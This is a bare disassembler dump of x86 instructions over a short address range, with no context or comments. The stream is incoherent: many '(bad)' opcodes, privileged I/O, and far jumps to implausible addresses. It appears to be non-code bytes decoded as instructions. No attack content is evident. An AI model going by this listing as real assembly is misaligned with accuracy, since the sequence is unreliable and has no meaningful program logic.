  41e84f:	aaa    
  41e850:	scas   al,BYTE PTR es:[edi]
  41e851:	jge    0x41e863
  41e853:	dec    edx
  41e854:	aas    
  41e855:	jae    0x41e863
  41e857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e858:	jge    0x41e823
  41e85a:	mov    eax,DWORD PTR [ebx-0x65]
  41e85d:	and    BYTE PTR [ebp-0x78],ch
  41e860:	mov    al,0xfd
  41e862:	cli    
  41e863:	(bad)  
  41e865:	fstp   st(5)
  41e867:	call   0x6768:0x32bf707
  41e86e:	mov    ds:0xafb466d0,eax
  41e873:	pop    ebp
  41e874:	pop    ebx
  41e875:	and    BYTE PTR [edi-0x57],bh
  41e878:	pop    eax
  41e879:	push   esi
  41e87a:	push   ecx
  41e87b:	shr    DWORD PTR [eax],0xfb
  41e87e:	and    BYTE PTR [ebp+0x1],0x5e
  41e882:	inc    edi
  41e883:	push   edx
  41e884:	jno    0x41e879
  41e886:	cwde   
  41e887:	hlt    
  41e888:	fwait
  41e889:	repz push ecx
  41e88b:	pop    edx
  41e88c:	mov    BYTE PTR [esp+edi*8-0x19323970],bl
  41e893:	dec    ecx
  41e894:	mov    ecx,0x27bb76f8
  41e899:	sub    al,al
  41e89b:	push   esp
  41e89c:	fwait
  41e89d:	int    0x57
  41e89f:	mov    dh,BYTE PTR [edx-0x4cf25027]
  41e8a5:	loopne 0x41e901
  41e8a7:	out    0xea,al
  41e8a9:	push   esi
  41e8aa:	cdq    
  41e8ab:	dec    edx
  41e8ac:	pop    ebx
  41e8ad:	mov    cl,0x4f
  41e8af:	neg    BYTE PTR [ebx-0x141ee7a6]
  41e8b5:	jl     0x41e89b
  41e8b7:	add    al,0x83
  41e8b9:	ds (bad) 
  41e8bb:	mov    ds,WORD PTR ds:0xa9fb61f7
  41e8c1:	cmp    BYTE PTR [eax],al
  41e8c3:	dec    esp
  41e8c4:	(bad)  
  41e8c5:	fstp   QWORD PTR [edx-0x7e648552]
  41e8cb:	jo     0x41e901
  41e8cd:	in     al,0x4e
  41e8cf:	pop    eax
  41e8d0:	mov    cl,BYTE PTR [eax-0x1ef078f0]
  41e8d6:	sbb    edi,DWORD PTR [edx-0x7e]
  41e8d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8da:	retf   0x9f4e
  41e8dd:	and    al,BYTE PTR [edx+0x507f81a9]
  41e8e3:	sub    al,0xb4
  41e8e5:	sbb    cl,BYTE PTR [edx]
  41e8e7:	dec    edx
  41e8e8:	neg    DWORD PTR [eax+ecx*2-0x4f]
  41e8ec:	loope  0x41e922
  41e8ee:	lods   eax,DWORD PTR ds:[esi]
  41e8ef:	dec    esp
  41e8f0:	or     eax,0xcb48fe8
  41e8f5:	mov    bh,0x9b
  41e8f7:	mov    esp,DWORD PTR [esi+0x1a]
  41e8fa:	and    al,0x4a
  41e8fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8fd:	cmp    ebp,0x36757635
  41e903:	(bad)  
  41e904:	sahf   
  41e905:	outs   dx,BYTE PTR ds:[esi]
  41e906:	popf   
  41e907:	lea    ebp,[ebp+0x57]
  41e90a:	aas    
  41e90b:	adc    ch,BYTE PTR [ebp+0x134d6d18]
  41e911:	mov    esp,DWORD PTR [esi+eax*2+0x4a77847c]
  41e918:	xchg   esi,eax
  41e919:	fcomp  DWORD PTR [ebp+edx*8-0x65]
  41e91d:	mov    ebp,0x4610fb99
  41e922:	mov    esi,0x26ddc7cf
  41e927:	cli    
  41e928:	(bad)  
  41e929:	loop   0x41e971
  41e92b:	retf   0x9ab6
  41e92e:	sub    BYTE PTR [ecx+0x5b7daf9c],dh
  41e934:	lea    ebp,[ebp+edx*1-0x66]
  41e938:	xchg   eax,ebp
  41e93a:	outs   dx,BYTE PTR ds:[esi]
  41e93b:	dec    edx
  41e93c:	add    DWORD PTR [ecx-0x49],ebp
  41e93f:	mov    ecx,0x98ecf653
  41e944:	fwait
  41e945:	mov    DWORD PTR [eax-0x6e],eax
  41e948:	mov    cl,0x7c
  41e94a:	mov    dl,0x8b
  41e94c:	nop
  41e94d:	fimul  WORD PTR [edi+edx*4-0x3d]
  41e951:	nop
  41e952:	cmp    BYTE PTR [edx],dh
  41e954:	mov    bl,0x69
  41e956:	nop
  41e957:	cmp    al,0x2
  41e959:	push   ss
  41e95a:	xchg   edx,eax
  41e95b:	sbb    al,BYTE PTR [edx-0x71]
  41e95e:	mov    al,0x2d
  41e960:	cmp    cl,al
  41e962:	mov    al,0xd1
  41e964:	and    al,0xc2
  41e966:	(bad)  
  41e967:	pop    eax
  41e968:	clc    
  41e969:	mov    dl,0x9
  41e96b:	xchg   ebp,eax
  41e96c:	xor    BYTE PTR [ecx+0x7319f9f3],0xda
  41e973:	jmp    0x3f571313
  41e978:	mov    al,ds:0xfc16ee9f
  41e97d:	fst    st(0)
  41e97f:	cmp    eax,0xa0a24092
  41e984:	je     0x41e913
  41e986:	loopne 0x41e9bc
  41e988:	je     0x41e92f
  41e98a:	or     BYTE PTR [ebp-0xfd3fc62],bh
  41e990:	mov    esi,0xd4299c3e
  41e995:	test   DWORD PTR [ebp-0x3c],edx
  41e998:	ja     0x41e979
  41e99a:	xor    bh,dh
  41e99c:	leave  
  41e99d:	push   eax
  41e99e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e99f:	and    ch,BYTE PTR [ebx]
  41e9a1:	ds dec esi
  41e9a3:	xchg   DWORD PTR [ecx-0x2896f949],ebp
  41e9a9:	popf   
  41e9aa:	sahf   
  41e9ab:	pop    edx
  41e9ac:	inc    eax
  41e9ad:	stos   BYTE PTR es:[edi],al
  41e9ae:	retf   
  41e9af:	outs   dx,DWORD PTR ds:[esi]
  41e9b0:	add    BYTE PTR [ebp+0x33ad4a3d],ah
  41e9b6:	mov    BYTE PTR [edx],ch
  41e9b8:	mov    eax,ds:0x2d5890de
  41e9bd:	cmp    al,0xd9
  41e9bf:	jne    0x41e9b4
  41e9c1:	sbb    BYTE PTR [eax-0x32],ah
  41e9c4:	clc    
  41e9c5:	(bad)  
  41e9c7:	cs scas al,BYTE PTR es:[edi]
  41e9c9:	out    dx,eax
  41e9ca:	jge    0x41e94e
  41e9cc:	xor    al,0xac
  41e9ce:	lods   al,BYTE PTR ds:[esi]
  41e9cf:	pop    ebp
  41e9d0:	push   edi
  41e9d1:	and    DWORD PTR [edi-0x33],0xffffffa0
  41e9d5:	test   DWORD PTR [ebp-0x48],ebp
  41e9d8:	sbb    esi,DWORD PTR [eax-0x2192b27a]
  41e9de:	xchg   ecx,eax
  41e9df:	xor    DWORD PTR ds:0x3c0f0ed5,0xffffffdc
  41e9e6:	nop
  41e9e7:	push   edi
  41e9e8:	dec    ebp
  41e9e9:	bound  ebp,QWORD PTR ds:0x129b0ac2
  41e9ef:	dec    edx
  41e9f0:	xchg   ebp,eax
  41e9f1:	mov    ?,WORD PTR [edi]
  41e9f3:	sub    bh,bl
  41e9f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9f6:	lods   eax,DWORD PTR ds:[esi]
  41e9f7:	xchg   edx,eax
  41e9f8:	fwait
  41e9f9:	xor    dh,ah
  41e9fb:	jne    0x41e9cc
  41e9fd:	push   eax
  41e9fe:	xchg   edi,eax
  41e9ff:	xor    dh,BYTE PTR [edi]
  41ea01:	jecxz  0x41ea50
  41ea03:	aas    
  41ea04:	jg     0x41e9cf
  41ea06:	or     eax,0x865e58cf
  41ea0b:	pop    edi
  41ea0c:	jp     0x41ea41
  41ea0e:	nop
  41ea0f:	push   0xcf6b4f15
  41ea14:	cdq    
  41ea15:	(bad)  
  41ea16:	mov    ch,0x58
  41ea18:	push   0xbbefff5f
  41ea1d:	jmp    0xb342ea70
  41ea22:	scas   al,BYTE PTR es:[edi]
  41ea23:	test   eax,0xef1094a3
  41ea28:	cmp    DWORD PTR [ebx-0x67],0x5a
  41ea2c:	mov    bl,0x2c
  41ea2e:	ret    
  41ea2f:	add    eax,eax
  41ea31:	fsubp  st(2),st
  41ea33:	xchg   ecx,eax
  41ea34:	or     BYTE PTR [ecx+0x43],bl
  41ea37:	cmp    al,0x77
  41ea39:	and    DWORD PTR [edx+ecx*2],ebp
  41ea3c:	xor    al,0xce
  41ea3e:	mov    eax,0x72f647c3
  41ea43:	mov    cs,WORD PTR [ebp+0x19b49ef7]
  41ea49:	in     al,0x2f
  41ea4b:	sub    cl,bh
  41ea4d:	shr    cl,1
  41ea4f:	clc    
  41ea50:	pop    esp
  41ea51:	fimul  WORD PTR [eax+0x7dabe04]
  41ea57:	sbb    bl,BYTE PTR [ebp-0x2e]
  41ea5a:	nop
  41ea5b:	in     eax,dx
  41ea5c:	cmc    
  41ea5d:	or     al,0x23
  41ea5f:	xchg   edi,eax
  41ea60:	or     DWORD PTR [edx],ecx
  41ea62:	ror    DWORD PTR [ebp-0x6c],cl
  41ea65:	cmc    
  41ea66:	lea    esi,[edx+ebp*1+0x73cfb661]
  41ea6d:	mov    BYTE PTR [edx],cl
  41ea6f:	mov    edi,DWORD PTR [edx-0x23e4485c]
  41ea75:	jmp    0x5da5f975
  41ea7a:	and    DWORD PTR fs:[esi+ebx*8-0x68],ebp
  41ea7f:	mov    edx,0x428ab5a3
  41ea84:	dec    ebp
  41ea85:	loop   0x41ea16
  41ea87:	lods   eax,DWORD PTR ds:[esi]
  41ea88:	nop
  41ea89:	mov    bh,0x14
  41ea8b:	mov    ah,0xf
  41ea8d:	jb     0x41ea24
  41ea8f:	push   edx
  41ea90:	imul   ecx,DWORD PTR [edx+0x64],0x9cb09b10
  41ea97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea98:	mov    al,0x22
  41ea9a:	nop
  41ea9b:	dec    eax
  41ea9c:	push   0x3584949
  41eaa1:	hlt    
  41eaa2:	das    
  41eaa3:	imul   ecx,edx,0x9b819832
  41eaa9:	pop    eax
  41eaaa:	sbb    BYTE PTR [ebx],ah
  41eaac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaad:	dec    al
  41eaaf:	int    0x9b
  41eab1:	je     0x41ea75
  41eab3:	cld    
  41eab4:	and    ah,dl
  41eab6:	jmp    0x1d18:0xa3de8b7a
  41eabd:	xchg   DWORD PTR [ebx],esp
  41eabf:	out    0xa7,eax
  41eac1:	lods   eax,DWORD PTR ds:[esi]
  41eac2:	lahf   
  41eac3:	inc    edi
  41eac4:	add    ah,bh
  41eac6:	jge    0x41ea52
  41eac8:	jecxz  0x41eaab
  41eaca:	mov    dl,0x32
  41eacc:	rcr    ch,cl
  41eace:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41ead0:	int    0x53
  41ead2:	call   0x7463762e
  41ead7:	adc    eax,0x4701df9b
  41eadc:	xor    ebx,DWORD PTR [ecx]
  41eade:	iret   
  41eadf:	push   0xffffffe8
  41eae1:	ins    DWORD PTR es:[edi],dx
  41eae2:	xchg   BYTE PTR [edx+0x58ef90ce],bl
  41eae8:	aad    0x4a
  41eaea:	dec    ebx
  41eaeb:	bound  ecx,QWORD PTR [edx-0x9]
  41eaee:	dec    edi
  41eaef:	sbb    al,ah
  41eaf1:	hlt    
  41eaf2:	adc    DWORD PTR [ecx-0x44ce8a5e],esi
  41eaf8:	ret    
  41eaf9:	adc    edi,DWORD PTR [esi-0x164bd6f7]
  41eaff:	mov    al,cl
  41eb01:	fst    QWORD PTR [ebx+eax*4+0x77ed1979]
  41eb08:	stos   BYTE PTR es:[edi],al
  41eb09:	pop    ebx
  41eb0a:	xchg   ebp,eax
  41eb0b:	scas   eax,DWORD PTR es:[edi]
  41eb0c:	int3   
  41eb0d:	mov    dh,0x91
  41eb0f:	cmp    dl,BYTE PTR [ebp+0x5e]
  41eb12:	cmp    BYTE PTR [edi-0x44],al
  41eb15:	or     eax,0x86aefb99
  41eb1a:	jnp    0x41eb67
  41eb1c:	mov    dh,0x95
  41eb1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb1f:	inc    edi
  41eb20:	sbb    dl,BYTE PTR [si]
  41eb23:	dec    edx
  41eb24:	or     bh,al
  41eb26:	stos   BYTE PTR es:[edi],al
  41eb27:	test   al,0xe7
  41eb29:	and    eax,ecx
  41eb2b:	scas   al,BYTE PTR es:[edi]
  41eb2c:	fwait
  41eb2d:	test   eax,0x7ac93c8c
  41eb32:	cmp    BYTE PTR [edi],bh
  41eb34:	add    al,0xc0
  41eb36:	int    0x77
  41eb38:	sti    
  41eb39:	ins    BYTE PTR es:[edi],dx
  41eb3a:	sub    cl,BYTE PTR [edx-0x6a]
  41eb3d:	lahf   
  41eb3e:	dec    esp
  41eb3f:	sbb    DWORD PTR [eax-0x61f76068],0x836a8dee
  41eb49:	sub    al,0x3c
  41eb4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb4c:	outs   dx,BYTE PTR ds:[esi]
  41eb4d:	push   ebx
  41eb4e:	out    0x84,al
  41eb50:	cmp    BYTE PTR [ebx+0x20e8f810],bh
  41eb56:	loop   0x41eb3f
  41eb58:	mov    edx,0x9b7172c4
  41eb5d:	sub    BYTE PTR [ebx+0x123f276e],0x89
  41eb64:	xor    al,0x36
  41eb66:	call   0x4b9286b5
  41eb6b:	cmc    
  41eb6c:	cli    
  41eb6d:	outs   dx,BYTE PTR ds:[esi]
  41eb6e:	data16 (bad) 
  41eb70:	pushf  
  41eb71:	xor    DWORD PTR [esi],esp
  41eb73:	out    0x35,al
  41eb75:	fisttp QWORD PTR [edi-0xc]
  41eb78:	xchg   esp,eax
  41eb79:	test   DWORD PTR [edi+eax*2-0x50],esi
  41eb7d:	sub    eax,0xdec7e6e9
  41eb82:	fbstp  TBYTE PTR [edx+0x4f6c951]
  41eb88:	and    BYTE PTR [edx+0x29b55ab],dh
  41eb8e:	adc    eax,DWORD PTR [ecx+0x66]
  41eb91:	hlt    
  41eb92:	jge    0x41eb8a
  41eb94:	(bad)  
  41eb95:	fimul  WORD PTR [ecx-0x15]
  41eb98:	loop   0x41eb26
  41eb9a:	xchg   esp,eax
  41eb9b:	loop   0x41eb84
  41eb9d:	sub    eax,0xb3132097
  41eba2:	xor    esi,DWORD PTR [edx]
  41eba4:	or     ebx,DWORD PTR [ebx-0x13adea69]
  41ebaa:	push   es
  41ebab:	xor    al,0xc2
  41ebad:	fcom   DWORD PTR [eax+0x594887e0]
  41ebb3:	and    al,0x7d
  41ebb5:	fisttp DWORD PTR ds:0x7522c93b
  41ebbb:	leave  
  41ebbc:	stos   BYTE PTR es:[edi],al
  41ebbd:	(bad)  
  41ebbe:	outs   dx,DWORD PTR ds:[esi]
  41ebbf:	retf   
  41ebc0:	(bad)  
  41ebc1:	jl     0x41eb4f
  41ebc3:	ror    BYTE PTR [edi+0x634a7372],cl
  41ebc9:	add    esp,DWORD PTR [ebp+eax*2-0x4a]
  41ebcd:	shl    DWORD PTR [ecx+0x58],0x83
  41ebd1:	push   esp
  41ebd2:	retf   
  41ebd3:	push   ebx
  41ebd4:	lock pusha 
  41ebd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebd7:	fst    DWORD PTR [ebx+0x13]
  41ebda:	push   0x2a
  41ebdc:	xchg   ecx,eax
  41ebdd:	add    eax,ebx
  41ebdf:	push   eax
  41ebe0:	pop    eax
  41ebe1:	enterw 0xef4e,0x1e
  41ebe6:	and    eax,0x28d63d29
  41ebeb:	mov    dh,0x9b
  41ebed:	sar    BYTE PTR [eax-0x48],cl
  41ebf0:	stos   BYTE PTR es:[edi],al
  41ebf1:	add    eax,0xde47fe4c
  41ebf6:	jg     0x41eb9c
  41ebf8:	call   FWORD PTR [edi]
  41ebfa:	inc    edi
  41ebfb:	fldl2e 
  41ebfd:	cmp    edx,DWORD PTR [eax+0x530f8d86]
  41ec03:	and    BYTE PTR [esi-0x1a],0x45
  41ec07:	dec    edx
  41ec08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec09:	jo     0x41ebe2
  41ec0b:	ret    0xf70d
  41ec0e:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec10:	fwait
  41ec11:	shl    BYTE PTR [eax+ebp*1+0x22],0xbb
  41ec16:	xor    DWORD PTR [ebp-0x15],0x7dc7c0dd
  41ec1d:	cmp    eax,0xfb8dde2a
  41ec22:	popf   
  41ec23:	aad    0xd8
  41ec25:	xor    DWORD PTR [esi+0xb579249],0x8cf0ec63
  41ec2f:	push   ebx
  41ec30:	push   es
  41ec31:	ficomp WORD PTR [ebp+0x6]
  41ec34:	add    al,0x8c
  41ec36:	pop    esp
  41ec37:	sub    ebx,DWORD PTR [ebx-0x460c97e7]
  41ec3d:	loop   0x41ebdc
  41ec3f:	retf   
  41ec40:	cmp    DWORD PTR [edx],ecx
  41ec42:	and    edx,DWORD PTR [esi+0x35]
  41ec45:	jecxz  0x41eca8
  41ec47:	lods   eax,DWORD PTR ds:[esi]
  41ec48:	xor    esp,ecx
  41ec4a:	adc    DWORD PTR ds:0x1740b4df,0x728ff505
  41ec54:	clc    
  41ec55:	or     al,0x53
  41ec57:	popf   
  41ec58:	dec    ebx
  41ec59:	and    dh,al
  41ec5b:	dec    ecx
  41ec5c:	mov    ah,0xf1
  41ec5e:	into   
  41ec5f:	fidiv  DWORD PTR [esi+0x56]
  41ec62:	jnp    0x41ec05
  41ec64:	fidivr DWORD PTR [esi-0x67]
  41ec67:	int3   
  41ec68:	(bad)  
  41ec69:	fstp   DWORD PTR [esi+0x14]
  41ec6c:	xor    eax,0xf9847fc6
  41ec71:	or     eax,eax
  41ec73:	or     cl,BYTE PTR [ebx]
  41ec75:	add    al,BYTE PTR [ebx+0x7a1d924a]
  41ec7b:	int    0x6c
  41ec7d:	dec    ecx
  41ec7e:	lods   eax,DWORD PTR ds:[esi]
  41ec7f:	leave  
  41ec80:	mov    ds:0xf621d06f,eax
  41ec85:	stc    
  41ec86:	sub    ah,0x67
  41ec89:	fisubr WORD PTR [ecx+0xe]
  41ec8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec8d:	ds call 0xae9c1fed
  41ec93:	ins    DWORD PTR es:[edi],dx
  41ec94:	adc    BYTE PTR [eax-0x1e5177ad],cl
  41ec9a:	fwait
  41ec9b:	cmp    esp,ecx
  41ec9d:	ret    
  41ec9e:	adc    al,0x44
  41eca0:	sub    eax,0xdf5e71de
  41eca5:	pop    eax
  41eca6:	add    ecx,DWORD PTR [ebp-0x5a700d31]
  41ecac:	mov    ds:0x96b8d98d,al
  41ecb1:	inc    eax
  41ecb2:	mov    BYTE PTR [edx+0x66],cl
  41ecb5:	out    0x80,eax
  41ecb7:	call   FWORD PTR [ebx+edi*8]
  41ecba:	es out 0x9b,eax
  41ecbd:	sub    dh,bl
  41ecbf:	jge    0x41ec75
  41ecc1:	std    
  41ecc2:	mov    ebp,0xc5de7e8e
  41ecc7:	ins    DWORD PTR es:[edi],dx
  41ecc8:	jne    0x41ec5e
  41ecca:	or     al,0x13
  41eccc:	mov    cl,0xd8
  41ecce:	xchg   ecx,eax
  41eccf:	shr    BYTE PTR [ecx+0x78],1
  41ecd2:	mov    bl,dl
  41ecd4:	push   es
  41ecd5:	sub    eax,0xc82a4f88
  41ecda:	jmp    0xc91fa39a
  41ecdf:	xlat   BYTE PTR ds:[ebx]
  41ece0:	repnz in eax,0x99
  41ece3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ece4:	mov    ebp,0x51e090c9
  41ece9:	std    
  41ecea:	js     0x41ec90
  41ecec:	pop    ss
  41eced:	test   al,0x6f
  41ecef:	dec    edx
  41ecf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecf1:	pop    eax
  41ecf2:	leave  
  41ecf3:	gs and eax,0x9bd0495d
  41ecf9:	sub    ax,0x390d
  41ecfd:	push   esi
  41ecfe:	rcl    DWORD PTR [edi+0x49badbdd],0x7a
  41ed05:	xor    al,0x3e
  41ed07:	rol    BYTE PTR [eax+0x4bd4384f],cl
  41ed0d:	test   eax,0x7a9b9f20
  41ed12:	cmp    eax,0x4e15b33c
  41ed17:	inc    ebx
  41ed18:	mov    al,0xdd
  41ed1a:	jg     0x41ed68
  41ed1c:	call   FWORD PTR [ecx-0x2f]
  41ed1f:	inc    esp
  41ed20:	mov    BYTE PTR ds:0x54455990,cl
  41ed26:	in     al,0xd2
  41ed28:	stc    
  41ed29:	imul   esp,eax,0x4a
  41ed2c:	xor    DWORD PTR [ebp+0x17],0x35b4affd
  41ed33:	ss scas al,BYTE PTR es:[edi]
  41ed35:	sub    DWORD PTR [eax+0x629dd10b],edx
  41ed3b:	jbe    0x41ecd4
  41ed3d:	(bad)  
  41ed3e:	dec    ebx
  41ed3f:	dec    edx
  41ed40:	aam    0x69
  41ed42:	mov    ecx,0xdb91e83e
  41ed47:	(bad)  
  41ed48:	fwait
  41ed49:	sbb    cl,BYTE PTR [edx-0x492ac6ec]
  41ed4f:	push   0x2ed9f55d
  41ed54:	mul    al
  41ed56:	sbb    al,0x3f
  41ed58:	dec    ecx
  41ed59:	(bad)  
  41ed5a:	and    BYTE PTR [esi],ch
  41ed5c:	imul   DWORD PTR [esi-0x75beee32]
  41ed62:	xchg   edx,eax
  41ed63:	fistp  WORD PTR [ebx-0x2a1ae99f]
  41ed69:	push   edi
  41ed6a:	push   edi
  41ed6b:	dec    edx
  41ed6c:	into   
  41ed6d:	mov    ebx,0xa9ff8c7b
  41ed72:	cli    
  41ed73:	mov    ds:0xfb0fc69b,al
  41ed78:	xchg   ebx,eax
  41ed79:	fs inc edi
  41ed7b:	mov    al,0x33
  41ed7d:	pop    ebx
  41ed7e:	ror    DWORD PTR [ecx-0x48],1
  41ed81:	mov    ds:0x7f2f487f,al
  41ed86:	lahf   
  41ed87:	xor    al,0x9b
  41ed89:	test   al,0x1c
  41ed8b:	call   0xec9f:0x9f38f5b2
  41ed92:	iret   
  41ed93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed94:	into   
  41ed95:	popf   
  41ed96:	nop
  41ed97:	push   ebp
  41ed98:	mov    cl,0x9
  41ed9a:	(bad)  
  41ed9b:	xor    BYTE PTR [ebx+0x4f46d412],bl
  41eda1:	fstp   DWORD PTR [edx]
  41eda3:	repnz rcr ebp,0x80
  41eda7:	scas   eax,DWORD PTR es:[edi]
  41eda8:	test   BYTE PTR [ebx-0xe],bl
  41edab:	ret    0xc9a9
  41edae:	nop
  41edaf:	dec    esi
  41edb0:	adc    eax,0xe6f58934
  41edb5:	add    BYTE PTR [eax],0x4b
  41edb8:	mov    dh,0xf1
  41edba:	inc    eax
  41edbb:	jle    0x41ee21
  41edbd:	jmp    0x6190:0x1a2d3e6d
  41edc4:	ins    DWORD PTR es:[edi],dx
  41edc5:	sbb    DWORD PTR [esi+0x45],ebx
  41edc8:	stc    
  41edc9:	xor    BYTE PTR [ebp+ebp*1+0x4a545cbb],ch
  41edd0:	mov    ch,0x9e
  41edd2:	popf   
  41edd3:	sub    eax,0x1cf5bacf
  41edd8:	fwait
  41edd9:	sbb    BYTE PTR [edx+0x15],al
  41eddc:	pop    ecx
  41eddd:	dec    eax
  41edde:	xchg   ebx,eax
  41eddf:	mov    ch,0xf9
  41ede1:	sbb    bl,BYTE PTR [ebx]
  41ede3:	retf   
  41ede4:	xchg   edi,eax
  41ede5:	sbb    BYTE PTR [ecx-0x76],dl
  41ede8:	sbb    ebx,DWORD PTR [ebx-0x80]
  41edeb:	mov    eax,0xa3970435
  41edf0:	fwait
  41edf1:	test   al,0x1
  41edf3:	fnsave [edx]
  41edf5:	mov    eax,0xddd93843
  41edfa:	nop
  41edfb:	cwde   
  41edfc:	in     eax,dx
  41edfd:	sar    BYTE PTR [edi-0x5375a6f0],0xd0
  41ee04:	mov    edi,0x88fe1e7d
  41ee09:	sbb    BYTE PTR [edi+eax*4-0x4c8a1f3],0x76
  41ee11:	fistp  WORD PTR [ebp-0x72a3bbb7]
  41ee17:	aas    
  41ee18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee19:	xor    DWORD PTR [eax-0x3ea75df1],ebp
  41ee1f:	mov    edx,0x74d0b536
  41ee24:	je     0x41ee78
  41ee26:	(bad)  
  41ee27:	data16 jl 0x41ee8f
  41ee2a:	mov    cs,esi
  41ee2c:	std    
  41ee2d:	call   0x4555f893
  41ee32:	popf   
  41ee33:	adc    bl,BYTE PTR [ebx+0xbc29a76]
  41ee39:	xor    dl,bh
  41ee3b:	sbb    BYTE PTR [ebp+0xf49f4c4],al
  41ee41:	jae    0x41ee1b
  41ee43:	xchg   edx,eax
  41ee44:	jo     0x41eea4
  41ee46:	out    0x1c,eax
  41ee48:	fwait
  41ee49:	cli    
  41ee4a:	enter  0x7894,0x59
  41ee4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee4f:	adc    eax,0xc86ddaa
  41ee54:	(bad)  
  41ee55:	mov    ch,0x6e
  41ee57:	test   ebx,0xca96ec95
  41ee5d:	frstor [ebx]
  41ee5f:	push   ebp
  41ee60:	sub    DWORD PTR [esi-0x66],ecx
  41ee63:	test   al,0xf7
  41ee65:	fstp   QWORD PTR [edi+0x30]
  41ee68:	jb     0x41ee41
  41ee6a:	mov    al,ds:0x9002a884
  41ee6f:	addr16 jmp 0x1ddc:0xdf4df0e6
  41ee77:	dec    edx
  41ee78:	push   ebx
  41ee79:	test   DWORD PTR [edx-0x8],0x87e3a61f
  41ee80:	test   eax,0xeded0a6
  41ee85:	pop    esi
  41ee86:	gs push ebx
  41ee88:	daa    
  41ee89:	pop    ss
  41ee8a:	popa   
  41ee8b:	push   ecx
  41ee8c:	pop    es
  41ee8d:	jnp    0x41ee84
  41ee8f:	daa    
  41ee90:	inc    ecx
  41ee91:	mov    esi,0x99ebba15
  41ee96:	nop
  41ee97:	les    edi,FWORD PTR [esi]
  41ee99:	mov    al,0x13
  41ee9b:	sub    al,0x65
  41ee9d:	push   esi
  41ee9e:	mov    esp,0x93973786
  41eea3:	iret   
  41eea4:	pop    ds
  41eea5:	jb     0x41ef0a
  41eea7:	dec    ebx
  41eea8:	jnp    0x41eed6
  41eeaa:	pushf  
  41eeab:	lods   al,BYTE PTR ds:[esi]
  41eeac:	fwait
  41eead:	push   eax
  41eeae:	lock (bad) 
  41eeb0:	mov    dh,0xb6
  41eeb2:	js     0x41eee9
  41eeb4:	out    dx,eax
  41eeb5:	or     eax,0x4d198c5e
  41eeba:	pop    ds
  41eebb:	imul   ebx,DWORD PTR [ebx-0x11fa000d],0xf7f5da40
  41eec5:	mov    ebp,0xf08d4d2a
  41eeca:	xor    edx,DWORD PTR [esi+0x71382453]
  41eed0:	jp     0x41eeb5
  41eed2:	(bad)  
  41eed3:	paddw  mm2,QWORD PTR [eax+0x63b8bfff]
  41eeda:	sbb    eax,0x323aa84a
  41eedf:	add    al,0x4a
  41eee1:	sbb    esp,DWORD PTR ds:0xd6de9bd2
  41eee7:	daa    
  41eee8:	jecxz  0x41ef57
  41eeea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeec:	jmp    0x41ef44
  41eeee:	dec    ecx
  41eeef:	dec    edx
  41eef0:	in     eax,dx
  41eef1:	ret    
  41eef2:	mov    esi,0x12222fc9
  41eef7:	cmp    esi,DWORD PTR [edi-0x644778e7]
  41eefd:	pushf  
  41eefe:	xor    al,cl
  41ef00:	dec    ebp
  41ef02:	enter  0xadc5,0x3
  41ef06:	push   ss
  41ef07:	test   BYTE PTR [ebx-0x22],dl
  41ef0a:	jge    0x41ef82
  41ef0c:	jne    0x41ef22
  41ef0e:	mov    ch,ah
  41ef10:	fwait
  41ef11:	in     eax,dx
  41ef12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef13:	adc    ah,bh
  41ef15:	out    0x99,al
  41ef17:	and    eax,0x49b9d030
  41ef1c:	fld    QWORD PTR ds:0xc798bcf0
  41ef22:	test   al,0xfe
  41ef24:	jmp    0x41eed9
  41ef26:	cmp    BYTE PTR [esi-0x3beca765],dh
  41ef2c:	jle    0x41ef62
  41ef2e:	std    
  41ef2f:	es sbb ebx,esi
  41ef32:	jns    0x41eeed
  41ef34:	outs   dx,BYTE PTR ds:[esi]
  41ef35:	test   DWORD PTR [edi+ebx*8-0x45],edi
  41ef39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef3a:	nop
  41ef3b:	or     al,0x2d
  41ef3d:	inc    ecx
  41ef3e:	push   es
  41ef3f:	pop    edi
  41ef40:	call   0xce8bed40
  41ef45:	xor    eax,DWORD PTR [eax+0x7b]
  41ef48:	mov    dh,0xac
  41ef4a:	or     DWORD PTR [ebx],ebp
  41ef4c:	andnps xmm1,xmm6
  41ef4f:	idiv   ebx
  41ef51:	adc    eax,0x3a7166cf
  41ef56:	sub    al,0x1d
  41ef58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef59:	mov    dh,0x53
  41ef5b:	push   esi
  41ef5c:	xlat   BYTE PTR ds:[ebx]
  41ef5d:	mov    cl,0x5a
  41ef5f:	dec    ebp
  41ef60:	sahf   
  41ef61:	fld    TBYTE PTR [ebx-0x7e]
  41ef64:	bound  edx,QWORD PTR [esi+0x30]
  41ef67:	(bad)  
  41ef68:	aaa    
  41ef69:	mov    bl,0xcd
  41ef6b:	inc    eax
  41ef6c:	in     eax,0xf9
  41ef6e:	sahf   
  41ef6f:	lods   eax,DWORD PTR ds:[esi]
  41ef70:	fistp  DWORD PTR ds:0x46875c50
  41ef76:	out    dx,al
  41ef77:	dec    ecx
  41ef78:	pushf  
  41ef79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
